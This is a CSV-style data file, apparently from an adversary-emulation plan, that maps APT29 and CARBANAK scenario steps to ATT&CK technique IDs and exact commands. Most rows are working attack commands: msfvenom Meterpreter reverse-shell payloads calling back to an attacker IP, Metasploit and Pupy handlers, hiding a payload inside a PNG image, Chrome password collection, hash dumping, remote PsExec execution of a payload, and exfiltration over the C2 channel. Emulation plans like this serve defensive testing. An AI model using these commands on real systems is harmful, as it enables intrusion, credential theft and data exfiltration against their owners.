APT;SCENARIO;ID TECHNIQUE;TOOL;DESCRIPTION;COMMAND
APT29;1;T1041;pupy;exfiltration over C2 channel;"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`"
APT29;1;T1105;metasploit;start Metasploit handler;[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`
APT29;1;T1105;pupy;upload [monkey.png] to target;"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`"
APT29;1;T1105;metasploit;upload compromised version of [SysinternalsSuite.zip] to target;"[meterpreter\*] > `upload SysinternalsSuite.zip ""C:\\Users\\username\\Downloads\\SysinternalsSuite.zip""`"
APT29;1;T1070.004;metasploit;delete [SysinternalsSuite.zip] file;"[meterpreter (PowerShell)\*] > `.\sdelete64.exe /accepteula ""$env:USERPROFILE\Downloads\SysinternalsSuite.zip""`"
APT29;1;T1555.003;chrome passwords;execute chrome-password collector;"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`"
APT29;1;T1003.002;metasploit;dump password hashes;[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`
APT29;1;T1569.002;psexec;execute [SeaDuke] remotely via PSEXEC;"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`"
APT29;1;;pupy;generate a Pupy-EC4 callback payload;`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`
APT29;1;;metasploit;generate a PowerShell-formatted Meterpreter payload;`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`
APT29;1;;Invoke PSImage;embed meterpreter.ps1 into a PNG file using Invoke-PSImage;`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`
APT29;1;;metasploit;generate a Meterpreter service-binary (persistence service payload);`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`
APT29;1;;metasploit;generate python-formatted Meterpreter;`msfvenom -p python/meterpreter/reverse_https LHOST=<attacker IP> LPORT=8443 -o python.py`
CARBANAK;1;;metasploit;start Metasploit;`sudo msfconsole`
CARBANAK;1;;metasploit;set up TCP listener for Meterpreter on TCP port 8080;"```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```"
